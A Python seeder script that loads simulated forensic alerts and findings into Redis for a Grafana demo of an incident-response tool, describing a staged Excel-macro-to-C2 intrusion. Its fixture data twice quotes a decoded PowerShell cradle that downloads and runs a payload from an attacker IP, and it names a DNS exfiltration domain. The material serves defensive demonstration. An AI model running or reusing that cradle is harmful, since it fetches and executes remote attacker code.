#!/usr/bin/env python3
"""
ZeroSpoil — Grafana Demo Data Seeder
Seeds Redis with forensic alerts matching the actual kill chain
from the Claude Code analysis (2026-04-30 triage report).

Usage:
    python3 seed_demo_data.py              # Seed + start API bridge
    python3 seed_demo_data.py --seed-only  # Just seed Redis
"""
import json
import time
import sys
import os
import hashlib
from datetime import datetime, timezone, timedelta

import redis

REDIS_HOST = os.environ.get("REDIS_HOST", "127.0.0.1")
REDIS_PORT = int(os.environ.get("REDIS_PORT", "6379"))

r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True, socket_timeout=5)


def pub(alert, minutes_ago=0):
    ts = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    alert["timestamp"] = ts.isoformat()
    alert["id"] = hashlib.md5(json.dumps(alert, sort_keys=True).encode()).hexdigest()[:12]
    r.zadd("zerospoil:alerts", {json.dumps(alert): ts.timestamp()})


def seed():
    print("Seeding ZeroSpoil Grafana demo data...")

    # Clear old alerts (keep win11:* evidence intact)
    for key in r.scan_iter("zerospoil:*"):
        r.delete(key)
    print("  Cleared old zerospoil:* keys")

    # -- Heartbeats --
    now = datetime.now(timezone.utc).isoformat()
    r.hset("zerospoil:heartbeat", mapping={
        "disk_mcp": now, "memory_mcp": now, "network_mcp": now, "orchestrator": now,
    })

    # -- Status --
    r.set("zerospoil:status", json.dumps({
        "phase": "idle",
        "detail": "Analysis complete: 8 findings in 3m59s",
        "progress": 100,
        "updated_at": now
    }))

    # -- Metrics --
    r.set("zerospoil:metrics", json.dumps({
        "run_id": "20260430_005924",
        "elapsed_sec": 239,
        "processes_analyzed": 162,
        "statistical_anomalies": 3,
        "llm_findings": 8,
        "kill_chain_detected": True,
        "overall_severity": "critical",
        "completed_at": now
    }))

    # -- Kill chain (matches the actual triage report) --
    r.set("zerospoil:kill_chain", json.dumps({
        "detected": True,
        "phases": ["initial_access", "execution", "defense_evasion", "command_control", "exfiltration"],
        "narrative": (
            "invoice_april.xlsm (T1566.001) -> EXCEL.EXE spawns powershell.exe "
            "(T1059.001) with -Enc download stager -> drops svchost.exe in Temp "
            "(T1036.005) + xkqtmrwz.exe + cfg.dat -> timestomps all files "
            "(T1070.006, 828-1266 day SI/FN deltas) -> C2 beacon to "
            "185.220.101.45:443 at 60s intervals (T1071.001) -> DNS exfil via "
            "base64 subdomains to *.exfil.evilc2.net (T1048.003)"
        )
    }))

    # -- Findings (from actual Claude Code triage report) --
    r.set("zerospoil:findings", json.dumps({
        "findings": [
            {"id": "P-1", "category": "process", "severity": "critical",
             "title": "Excel macro -> PowerShell download stager",
             "detail": "EXCEL.EXE (PID 11111) spawned powershell.exe (PID 11112) with -NoP -NonI -W Hidden -Exec Bypass -Enc. Decoded: iex (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload')",
             "confidence": "HIGH", "indicators": ["PID 11111", "PID 11112", "185.220.101.45"], "mitre_attack": "T1566.001, T1059.001"},
            {"id": "P-2", "category": "process", "severity": "critical",
             "title": "Fake svchost.exe in %TEMP% (masquerading)",
             "detail": "svchost.exe (PID 11113) running from C:\\Users\\User\\AppData\\Local\\Temp\\. Parent: powershell.exe. Legitimate svchost only runs from System32 spawned by services.exe.",
             "confidence": "HIGH", "indicators": ["PID 11113", "Temp\\svchost.exe"], "mitre_attack": "T1036.005"},
            {"id": "P-3", "category": "process", "severity": "high",
             "title": "Unknown dropper uihoqnno.exe (no disk path)",
             "detail": "PID 11114, parent powershell.exe, null path. Either deleted-on-launch or memory-only injection. Self-correction: downgraded to MEDIUM confidence — Volatility psscan unavailable to confirm.",
             "confidence": "MEDIUM", "indicators": ["PID 11114", "uihoqnno.exe"], "mitre_attack": "T1055/T1070.004"},
            {"id": "P-4", "category": "process", "severity": "info",
             "title": "Legitimate activity excluded (collector agent)",
             "detail": "cmd.exe (PID 5252) -> python.exe (PID 1152) running collector_agent.py. This is the ZeroSpoil collection environment. Cleared.",
             "confidence": "HIGH", "indicators": [], "mitre_attack": ""},
            {"id": "D-1", "category": "disk", "severity": "high",
             "title": "svchost.exe timestomped (828-day SI/FN delta)",
             "detail": "Inode 642: SI Created 2026-04-22 19:00:00, FN Created 2024-01-15 08:23:11. Delta: 828 days. Toolkit compiled 14 months before deployment.",
             "confidence": "HIGH", "indicators": ["inode 642"], "mitre_attack": "T1070.006"},
            {"id": "D-2", "category": "disk", "severity": "high",
             "title": "xkqtmrwz.exe timestomped (1047-day delta)",
             "detail": "Inode 891: SI Created 2026-04-22 19:00:01, FN Created 2023-06-10 14:05:33. Random 8-char name = classic dropper pattern.",
             "confidence": "HIGH", "indicators": ["inode 891"], "mitre_attack": "T1070.006"},
            {"id": "D-3", "category": "disk", "severity": "high",
             "title": "cfg.dat timestomped (1266-day delta)",
             "detail": "Inode 1024: SI Created 2026-04-22 19:00:02, FN Created 2022-11-03 09:17:44. C2 config file, toolkit 3.5 years old.",
             "confidence": "HIGH", "indicators": ["inode 1024"], "mitre_attack": "T1070.006"},
            {"id": "N-1", "category": "network", "severity": "critical",
             "title": "C2 beacon: 60s fixed interval to Tor exit node",
             "detail": "192.168.179.132 -> 185.220.101.45:443, 60s interval, constant 144-byte payload, zero jitter. Tor exit node used for anonymization.",
             "confidence": "HIGH", "indicators": ["185.220.101.45", "443/TCP", "60s"], "mitre_attack": "T1071.001"},
            {"id": "N-2", "category": "network", "severity": "critical",
             "title": "DNS exfiltration via base64 subdomain tunneling",
             "detail": "Queries to *.exfil.evilc2.net with base64-encoded subdomains. Decoded: 'hello world', 'this is exfil', 'testing 123'. Attacker testing exfil channel.",
             "confidence": "HIGH", "indicators": ["exfil.evilc2.net", "8.8.8.8"], "mitre_attack": "T1048.003"},
        ],
        "kill_chain": {"detected": True, "phases": ["initial_access", "execution", "defense_evasion", "command_control", "exfiltration"]},
        "overall_severity": "critical",
        "recommendation": "Immediate containment: isolate 192.168.179.132, block 185.220.101.45 and *.evilc2.net at perimeter."
    }))

    # -- Alert timeline (matches triage report sequence) --
    alerts = [
        {"source": "orchestrator", "severity": "info", "type": "scan_start",
         "title": "Claude Code analysis initiated",
         "detail": "Loading MCP tool schemas, starting multi-pass forensic analysis", "confidence": "HIGH"},

        {"source": "memory", "severity": "info", "type": "scan_complete",
         "title": "Process baseline captured from Redis",
         "detail": "162 processes loaded from win11:processes:evil", "confidence": "HIGH"},

        {"source": "disk", "severity": "info", "type": "scan_complete",
         "title": "MFT entries loaded",
         "detail": "3 MFT entries (inodes 642, 891, 1024) loaded from Redis", "confidence": "HIGH"},

        {"source": "network", "severity": "info", "type": "scan_complete",
         "title": "Network artifacts loaded",
         "detail": "PCAP data with 6 connection records loaded", "confidence": "HIGH"},

        {"source": "statistical", "severity": "high", "type": "orphan_process",
         "title": "Orphan: powershell.exe spawned by EXCEL.EXE",
         "detail": "PID 11112 parent PID 11111 (EXCEL.EXE) — Office macro execution chain", "confidence": "HIGH"},

        {"source": "memory", "severity": "critical", "type": "anomaly",
         "title": "Fake svchost.exe in Temp directory",
         "detail": "PID 11113, path C:\\Users\\User\\AppData\\Local\\Temp\\svchost.exe, parent powershell.exe", "confidence": "HIGH"},

        {"source": "memory", "severity": "high", "type": "anomaly",
         "title": "Unknown process uihoqnno.exe (null path)",
         "detail": "PID 11114, parent powershell.exe, no disk path — possible injection or deleted-on-launch", "confidence": "MEDIUM"},

        {"source": "network", "severity": "critical", "type": "anomaly",
         "title": "C2 beacon pattern: 60s interval to 185.220.101.45:443",
         "detail": "3 connections at exact 60s intervals, constant 144-byte payload, Tor exit node", "confidence": "HIGH"},

        {"source": "network", "severity": "critical", "type": "anomaly",
         "title": "DNS exfiltration to *.exfil.evilc2.net",
         "detail": "Base64-encoded data in subdomain labels, 3 queries to evilc2.net via 8.8.8.8", "confidence": "HIGH"},

        {"source": "disk", "severity": "high", "type": "anomaly",
         "title": "Timestomping: svchost.exe SI/FN delta 828 days",
         "detail": "Inode 642: SI=2026-04-22T19:00:00 FN=2024-01-15T08:23:11", "confidence": "HIGH"},

        {"source": "disk", "severity": "high", "type": "anomaly",
         "title": "Timestomping: xkqtmrwz.exe SI/FN delta 1047 days",
         "detail": "Inode 891: SI=2026-04-22T19:00:01 FN=2023-06-10T14:05:33", "confidence": "HIGH"},

        {"source": "disk", "severity": "high", "type": "anomaly",
         "title": "Timestomping: cfg.dat SI/FN delta 1266 days",
         "detail": "Inode 1024: SI=2026-04-22T19:00:02 FN=2022-11-03T09:17:44", "confidence": "HIGH"},

        {"source": "llm_analyst", "severity": "critical", "type": "llm_finding",
         "title": "PowerShell payload decoded",
         "detail": "iex (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload') — same C2 IP across all 3 layers", "confidence": "HIGH"},

        {"source": "llm_analyst", "severity": "critical", "type": "llm_finding",
         "title": "Full kill chain reconstructed (5 phases)",
         "detail": "Phishing -> Execution -> Defense Evasion -> C2 -> Exfiltration. All 3 evidence layers independently confirm.", "confidence": "HIGH"},

        {"source": "llm_analyst", "severity": "info", "type": "self_correction",
         "title": "Self-correction: P-3 downgraded to MEDIUM confidence",
         "detail": "uihoqnno.exe injection hypothesis unconfirmed — Volatility psscan unavailable on this host. Anomaly is real, cause is uncertain.", "confidence": "HIGH"},

        {"source": "orchestrator", "severity": "critical", "type": "analysis_complete",
         "title": "Analysis complete: CONFIRMED ACTIVE COMPROMISE",
         "detail": "8 findings (4 CRITICAL, 4 HIGH), 3 statistical anomalies, kill chain DETECTED. Completed in 3m59s.", "confidence": "HIGH"},
    ]

    interval = 30.0 / len(alerts)
    for i, alert in enumerate(alerts):
        pub(alert, minutes_ago=30 - (i * interval))

    print(f"  Seeded {len(alerts)} alerts")

    # Print summary
    print(f"\nRedis keys:")
    for key in sorted(r.scan_iter("zerospoil:*")):
        ktype = r.type(key)
        if ktype == "zset":
            print(f"  {key} (sorted set, {r.zcard(key)} entries)")
        elif ktype == "hash":
            print(f"  {key} (hash, {r.hlen(key)} fields)")
        else:
            print(f"  {key} ({ktype})")

    # Also count existing evidence
    w11_count = len(list(r.scan_iter("win11:*")))
    print(f"\n  Existing evidence: {w11_count} win11:* keys (untouched)")
    print("\nDone!")


if __name__ == "__main__":
    try:
        r.ping()
    except redis.ConnectionError:
        print(f"ERROR: Cannot connect to Redis at {REDIS_HOST}:{REDIS_PORT}")
        sys.exit(1)

    seed()

    if "--seed-only" in sys.argv:
        print("\nSeed complete. Start API bridge manually:")
        print("  python3 grafana_api_bridge.py")
    else:
        print("\nStarting Grafana API Bridge on :5000...")
        print("Open Grafana at http://192.168.179.131:3000\n")
        import grafana_api_bridge
        grafana_api_bridge.app.run(host="0.0.0.0", port=5000, debug=False)
